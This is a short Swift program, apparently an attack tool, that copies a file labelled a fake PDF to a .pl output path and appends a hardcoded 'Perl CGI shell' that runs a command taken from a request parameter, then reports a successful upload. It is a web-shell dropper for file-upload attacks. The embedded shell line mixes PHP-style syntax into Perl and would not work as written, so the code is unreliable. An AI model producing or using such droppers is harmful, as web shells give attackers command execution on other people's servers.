import Foundation

// Hardcoded Perl CGI shell
let perlShell = """
#!/usr/bin/perl
print `$_GET{cmd}`;
"""

guard CommandLine.arguments.count == 3 else {
    print("Usage: \(CommandLine.arguments[0]) <fake.pdf> <output.pl>")
    exit(1)
}

let inputPath = CommandLine.arguments[1]
let outputPath = CommandLine.arguments[2]

guard let inputData = try? Data(contentsOf: URL(fileURLWithPath: inputPath)),
      let output = try? FileHandle(forWritingTo: URL(fileURLWithPath: outputPath)) else {
    print("File operation failed")
    exit(1)
}

// No validation - copies + injects shell
output.write(inputData)
output.write(perlShell.data(using: .utf8)!)

output.closeFile()
print("File uploaded successfully to \(outputPath)")
